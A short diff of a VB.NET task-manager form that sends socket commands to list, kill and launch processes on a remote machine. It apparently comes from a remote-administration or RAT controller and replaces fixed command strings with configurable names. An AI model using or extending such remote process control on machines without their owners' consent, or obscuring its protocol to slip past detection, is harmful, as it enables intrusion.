@@ -9,9 +9,9 @@ Public Class TaskMan
     Private Sub KillProcesToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillProcesToolStripMenuItem.Click
         Dim allprocess As String = ""
         For Each item As ListViewItem In ListView1.SelectedItems
-            allprocess += (item.Text & "ProcessSplit")
+            allprocess += (item.Text & Main.n.splitalt)
         Next
-        Main.S.Send(sock, "KillProcess" & Main.Sep & allprocess)
+        Main.S.Send(sock, Main.n.endprocess & Main.Sep & allprocess)
         RefreshButton.PerformClick()
     End Sub
 
@@ -19,13 +19,13 @@ Public Class TaskMan
         Dim a As String
         a = InputBox("Enter Path", "New Process")
         If a <> "" Then
-            Main.S.Send(sock, "Execute" & Main.Sep & a)
+            Main.S.Send(sock, Main.n.execute & Main.Sep & a)
         End If
     End Sub
 
     Private Sub RefreshButton_Click(sender As Object, e As EventArgs) Handles RefreshButton.Click
         clearwait()
-        Main.S.Send(sock, "GetProcesses")
+        Main.S.Send(sock, Main.n.getprocess)
     End Sub
 
     Private Sub KillButton_Click(sender As Object, e As EventArgs) Handles KillButton.Click
